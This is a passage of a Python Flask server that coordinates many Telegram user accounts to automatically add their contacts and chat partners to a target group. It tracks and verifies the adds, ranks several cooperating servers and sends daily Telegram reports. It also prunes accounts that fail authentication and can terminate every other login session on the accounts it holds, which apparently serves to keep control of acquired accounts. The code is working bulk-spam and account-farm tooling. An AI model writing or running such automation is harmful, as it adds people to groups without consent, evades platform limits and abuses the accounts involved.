    
    total_verified = sum(r.get('verified_count', 0) for r in result.values())
    total_attempted = sum(r.get('attempted', 0) for r in result.values())
    
    workers_detail = []
    for wid, data in result.items():
        acc = next((a for a in accounts if a['id'] == wid), None)
        workers_detail.append({
            'id': wid,
            'name': acc['name'] if acc else str(wid),
            'verified': data.get('verified_count', 0),
            'attempted': data.get('attempted', 0),
            'success_rate': data.get('success_rate', 0)
        })
    
    workers_detail.sort(key=lambda x: x['verified'], reverse=True)
    
    return jsonify({
        'success': True,
        'verification_time': stats.get('last_verification'),
        'summary': {
            'total_verified': total_verified,
            'total_attempted': total_attempted,
            'success_rate': round(total_verified / total_attempted * 100, 1) if total_attempted else 0
        },
        'workers': workers_detail
    })

@app.route('/api/verified-stats')
def verified_stats():
    reset_daily()
    
    workers_detail = []
    for a in accounts:
        aid_str = str(a['id'])
        ws = stats.get('worker_stats', {}).get(aid_str, {})
        workers_detail.append({
            'id': a['id'],
            'name': a.get('name', '?'),
            'total_attempted': ws.get('total', 0),
            'today_attempted': ws.get('today', 0),
            'total_verified': ws.get('verified_total', 0),
            'today_verified': ws.get('verified_today', 0),
            'is_admin': server_admin.get(str(SERVER_NUMBER)) == a['id']
        })
    
    workers_detail.sort(key=lambda x: x['today_verified'], reverse=True)
    
    return jsonify({
        'success': True,
        'server': SERVER_NAME,
        'server_number': SERVER_NUMBER,
        'today_verified': stats.get('verified_today', 0),
        'total_verified': stats.get('verified_total', 0),
        'today_attempted': stats.get('today_added', 0),
        'total_attempted': stats.get('total_added', 0),
        'last_verification': stats.get('last_verification'),
        'admin_linked': server_admin.get(str(SERVER_NUMBER)),
        'workers': workers_detail
    })

# ============================================
# REMAINING ROUTES (auto-add settings, test, join, sessions, ranking, report)
# ============================================
@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
def auto_add_settings_route():
    if request.method == 'GET':
        aid = request.args.get('accountId')
        aid_str = str(aid)
        s = auto_add_settings.get(aid_str, {
            'enabled': False, 'target_group': TARGET_GROUP, 'delay_seconds': 25, 'auto_join': True
        })
        s['account_id'] = aid
        s['added_today'] = stats.get('today_added', 0)
        s['total_added'] = stats.get('total_added', 0)
        s['verified_today'] = stats.get('verified_today', 0)
        s['verified_total'] = stats.get('verified_total', 0)
        s['server_name'] = SERVER_NAME
        s['server_number'] = SERVER_NUMBER
        s['is_admin'] = server_admin.get(str(SERVER_NUMBER)) == aid
        s['server_admin_id'] = server_admin.get(str(SERVER_NUMBER))
        ws = stats.get('worker_stats', {}).get(aid_str, {})
        s['worker_stats'] = ws
        return jsonify({'success': True, 'settings': s})
    
    data = request.json
    aid = data.get('accountId')
    akey = str(aid)
    
    was_on = auto_add_settings.get(akey, {}).get('enabled', False)
    auto_add_settings[akey] = {
        'enabled': data.get('enabled', False),
        'target_group': data.get('target_group', TARGET_GROUP),
        'delay_seconds': max(25, data.get('delay_seconds', 25)),
        'auto_join': True,
        'last_updated': datetime.now().isoformat()
    }
    
    if server_admin.get(str(SERVER_NUMBER)) == aid:
        auto_add_settings[akey]['is_server_admin'] = True
    
    save_json(SETTINGS_FILE, auto_add_settings)
    
    if data.get('enabled') and not was_on:
        acc = next((a for a in accounts if a['id'] == aid), None)
        if acc:
            start_auto_add(acc)
    
    return jsonify({'success': True, 'message': 'Settings saved'})

@app.route('/api/auto-add-stats')
def auto_add_stats():
    reset_daily()
    aid = request.args.get('accountId')
    aid_str = str(aid) if aid else None
    ws = stats.get('worker_stats', {}).get(aid_str, {}) if aid_str else {}
    
    return jsonify({
        'success': True,
        'added_today': stats.get('today_added', 0),
        'total_added': stats.get('total_added', 0),
        'verified_today': stats.get('verified_today', 0),
        'verified_total': stats.get('verified_total', 0),
        'server_name': SERVER_NAME,
        'server_number': SERVER_NUMBER,
        'worker_stats': ws
    })

@app.route('/api/test-auto-add', methods=['POST'])
def test_auto_add():
    try:
        aid = request.json.get('accountId')
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def test():
            client = get_client(acc)
            await client.connect()
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'Not authorized'}
                
                group_found = False
                group_title = TARGET_GROUP
                member_count = 0
                try:
                    grp = await client.get_entity(TARGET_GROUP)
                    group_found = True
                    group_title = getattr(grp, 'title', TARGET_GROUP)
                    participants = await client(GetParticipantsRequest(
                        channel=grp, filter=ChannelParticipantsRecent(),
                        offset=0, limit=1, hash=0
                    ))
                    member_count = participants.count if hasattr(participants, 'count') else len(participants.users)
                except:
                    pass
                
                available = 0
                try:
                    contacts = await client(GetContactsRequest(0))
                    available += len([c for c in contacts.users if not c.bot])
                except:
                    pass
                try:
                    dialogs = await client.get_dialogs(limit=200)
                    available += len([d for d in dialogs if d.is_user and not d.entity.bot])
                except:
                    pass
                
                return {
                    'success': True,
                    'group_found': group_found,
                    'group_title': group_title,
                    'group_members': member_count,
                    'available_members': available,
                    'target_group': TARGET_GROUP
                }
            finally:
                await client.disconnect()
        
        return jsonify(run_async(test()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/join-group', methods=['POST'])
def join_group():
    try:
        aid = request.json.get('accountId')
        grp = request.json.get('group', TARGET_GROUP)
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Not found'})
        
        async def join():
            client = get_client(acc)
            await client.connect()
            try:
                entity = await client.get_entity(grp)
                await client(JoinChannelRequest(entity))
                return {'success': True, 'message': f'Joined {grp}'}
            except Exception as e:
                if 'already' in str(e).lower():
                    return {'success': True, 'message': 'Already member'}
                return {'success': False, 'error': str(e)[:100]}
            finally:
                await client.disconnect()
        
        return jsonify(run_async(join()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

# ============================================
# DEVICE/SESSION MANAGEMENT
# ============================================
@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    try:
        data = request.json
        aid = data.get('accountId')
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def fetch():
            client = get_client(acc)
            await client.connect()
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'fresh_reset_forbidden'}
                
                result = await client(functions.account.GetAuthorizationsRequest())
                current_hash = None
                sessions = []
                
                for auth in result.authorizations:
                    session_info = {
                        'hash': str(auth.hash),
                        'device_model': auth.device_model or 'Unknown',
                        'platform': auth.platform or 'Unknown',
                        'system_version': auth.system_version or '',
                        'app_name': auth.app_name or '',
                        'app_version': auth.app_version or '',
                        'date_created': auth.date_created.timestamp() if auth.date_created else 0,
                        'date_active': auth.date_active.timestamp() if auth.date_active else 0,
                        'ip': auth.ip or 'Unknown',
                        'country': auth.country or 'Unknown',
                        'region': auth.region or '',
                        'current': auth.current
                    }
                    if auth.current:
                        current_hash = str(auth.hash)
                    sessions.append(session_info)
                
                return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
            except Exception as e:
                return {'success': False, 'error': str(e)[:100]}
            finally:
                await client.disconnect()
        
        return jsonify(run_async(fetch()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    try:
        data = request.json
        aid = data.get('accountId')
        hash_to_terminate = data.get('hash')
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def terminate():
            client = get_client(acc)
            await client.connect()
            try:
                await client(functions.account.ResetAuthorizationRequest(hash=int(hash_to_terminate)))
                return {'success': True, 'message': 'Session terminated'}
            except Exception as e:
                return {'success': False, 'error': str(e)[:100]}
            finally:
                await client.disconnect()
        
        return jsonify(run_async(terminate()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_sessions():
    try:
        data = request.json
        aid = data.get('accountId')
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def terminate():
            client = get_client(acc)
            await client.connect()
            try:
                result = await client(functions.account.GetAuthorizationsRequest())
                terminated = 0
                for auth in result.authorizations:
                    if not auth.current:
                        try:
                            await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                            terminated += 1
                        except:
                            pass
                
                return {'success': True, 'message': f'Terminated {terminated} sessions'}
            except Exception as e:
                return {'success': False, 'error': str(e)[:100]}
            finally:
                await client.disconnect()
        
        return jsonify(run_async(terminate()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

# ============================================
# RANKING & REPORT
# ============================================
@app.route('/api/ranking')
def ranking():
    reset_daily()
    
    our_stats = {
        'name': SERVER_NAME,
        'number': SERVER_NUMBER,
        'today_attempted': stats.get('today_added', 0),
        'today_verified': stats.get('verified_today', 0),
        'total_attempted': stats.get('total_added', 0),
        'total_verified': stats.get('verified_total', 0),
        'active_workers': len(accounts),
        'admin_linked': server_admin.get(str(SERVER_NUMBER)) is not None,
        'url': SERVER_URL
    }
    
    all_stats = [our_stats]
    
    for srv in OTHER_SERVERS:
        try:
            r = requests.get(f"{srv['url']}/api/public-stats", timeout=10)
            if r.status_code == 200:
                d = r.json()
                if d.get('success'):
                    all_stats.append({
                        'name': srv['name'],
                        'number': srv['num'],
                        'today_attempted': d['stats'].get('today_attempted', 0),
                        'today_verified': d['stats'].get('today_verified', 0),
                        'total_attempted': d['stats'].get('total_attempted', 0),
                        'total_verified': d['stats'].get('total_verified', 0),
                        'active_workers': d['stats'].get('active_accounts', 0),
                        'url': srv['url']
                    })
                    continue
        except:
            pass
        all_stats.append({
            'name': srv['name'],
            'number': srv['num'],
            'today_attempted': 0,
            'today_verified': 0,
            'total_attempted': 0,
            'total_verified': 0,
            'offline': True,
            'url': srv['url']
        })
    
    all_stats.sort(key=lambda x: (x.get('today_verified', 0), x.get('today_attempted', 0)), reverse=True)
    
    total_verified_today = sum(s.get('today_verified', 0) for s in all_stats)
    total_attempted_today = sum(s.get('today_attempted', 0) for s in all_stats)
    
    return jsonify({
        'success': True,
        'rankings': all_stats,
        'summary': {
            'total_verified_today': total_verified_today,
            'total_attempted_today': total_attempted_today,
            'active_servers': len([s for s in all_stats if not s.get('offline')]),
            'total_servers': len(all_stats)
        }
    })

@app.route('/api/send-report')
def send_report():
    reset_daily()
    
    resp = ranking()
    data = resp.get_json()
    rankings = data.get('rankings', [])
    summary = data.get('summary', {})
    
    report = f"""
📊 <b>DAILY AUTO-ADD REPORT</b>
📅 <b>{datetime.now().strftime('%Y-%m-%d %H:%M UTC')}</b>
━━━━━━━━━━━━━━━━━━━━━━
🏆 <b>RANKINGS (Verified)</b>
━━━━━━━━━━━━━━━━━━━━━━
"""
    
    medals = ['🥇', '🥈', '🥉']
    for i, s in enumerate(rankings):
        medal = medals[i] if i < 3 else f'{i+1}️⃣'
        status = '⚠️ OFFLINE' if s.get('offline') else '✅ ONLINE'
        verified = s.get('today_verified', 0)
        attempted = s.get('today_attempted', 0)
        rate = round(verified / attempted * 100, 1) if attempted > 0 else 0
        
        bar_len = max(1, int(verified / max(summary.get('total_verified_today', 1), 1) * 20))
        bar = '█' * bar_len + '░' * (20 - bar_len)
        
        report += f"""
{medal} <b>{s['name']}</b> [{status}]
   {bar} <b>{verified:,}</b> ({rate}%)
"""
    
    report += f"""
━━━━━━━━━━━━━━━━━━━━━━
✅ Verified Today: <b>{summary.get('total_verified_today', 0):,}</b>
📥 Attempted: <b>{summary.get('total_attempted_today', 0):,}</b>
🌐 Active: <b>{summary.get('active_servers', 0)}/{summary.get('total_servers', 0)}</b>
━━━━━━━━━━━━━━━━━━━━━━
🖥️ <b>{SERVER_NAME}</b> #{SERVER_NUMBER}
"""
    
    send_telegram(report)
    
    return jsonify({'success': True, 'message': 'Report sent'})

# ============================================
# KEEP ALIVE & SCHEDULERS
# ============================================
def keep_alive():
    while True:
        time.sleep(240)
        try:
            requests.get(f"{SERVER_URL}/ping", timeout=10)
        except:
            pass

def dead_account_checker():
    """Periodically check all accounts and remove dead ones"""
    while True:
        time.sleep(600)  # Every 10 minutes
        for acc in list(accounts):
            try:
                is_auth = check_account_auth(acc)
                if not is_auth:
                    remove_dead_account(acc['id'], "Periodic auth check failed")
                time.sleep(3)
            except Exception as e:
                logger.debug(f"Health check error: {e}")

def daily_report_scheduler():
    last = None
    while True:
        now = datetime.now()
        today = now.strftime('%Y-%m-%d')
        if now.hour in [0, 1] and last != today:
            time.sleep(random.randint(0, 1800))
            reset_daily()
            
            admin_id = server_admin.get(str(SERVER_NUMBER))
            if admin_id:
                admin_acc = next((a for a in accounts if a['id'] == admin_id), None)
                if admin_acc:
                    worker_ids = [a['id'] for a in accounts if a['id'] != admin_id]
                    verify_worker_adds(admin_acc, worker_ids)
            
            try:
                requests.get(f"{SERVER_URL}/api/send-report", timeout=30)
            except:
                pass
            last = today
        time.sleep(300)

def auto_verify_scheduler():
    while True:
        time.sleep(14400)
        try:
            admin_id = server_admin.get(str(SERVER_NUMBER))
            if admin_id:
                admin_acc = next((a for a in accounts if a['id'] == admin_id), None)
                if admin_acc:
                    worker_ids = [a['id'] for a in accounts if a['id'] != admin_id]
                    verify_worker_adds(admin_acc, worker_ids)
                    logger.info("Auto-verification completed")
        except Exception as e:
            logger.error(f"Auto-verify error: {e}")

def restore_and_start():
    time.sleep(5)
    for acc in list(accounts):
        if acc.get('session'):
            # Check auth before starting
            if check_account_auth(acc):
                start_auto_add(acc)
            else:
                remove_dead_account(acc['id'], "Failed auth check on startup")
            time.sleep(2)
    logger.info(f"🚀 All accounts processed")

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    print(f"""
╔══════════════════════════════════════╗
║  AUTO-ADD SERVER #{SERVER_NUMBER}                    ║
║  Name: {SERVER_NAME}                             ║
║  Target: @{TARGET_GROUP}                ║
║  Mode: VERIFIED TRACKING             ║
║  Port: {PORT}                           ║
║  Admin: {'Linked' if server_admin.get(str(SERVER_NUMBER)) else 'Not linked'}           ║
║  Dead Check: Every 10 min            ║
╚══════════════════════════════════════╝
    """)
    
    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=daily_report_scheduler, daemon=True).start()
    threading.Thread(target=auto_verify_scheduler, daemon=True).start()
    threading.Thread(target=dead_account_checker, daemon=True).start()
    threading.Thread(target=restore_and_start, daemon=True).start()
    
    send_telegram(
        f"🟢 <b>{SERVER_NAME}</b> Online!\n"
        f"📋 Server #{SERVER_NUMBER}\n"
        f"🎯 @{TARGET_GROUP}\n"
        f"🔍 Verified Tracking\n"
        f"🗑️ Auto-remove dead accounts\n"
        f"👑 Admin: {'Linked ✅' if server_admin.get(str(SERVER_NUMBER)) else 'Not linked ❌'}"
    )
    
    app.run(host='0.0.0.0', port=PORT, debug=False)
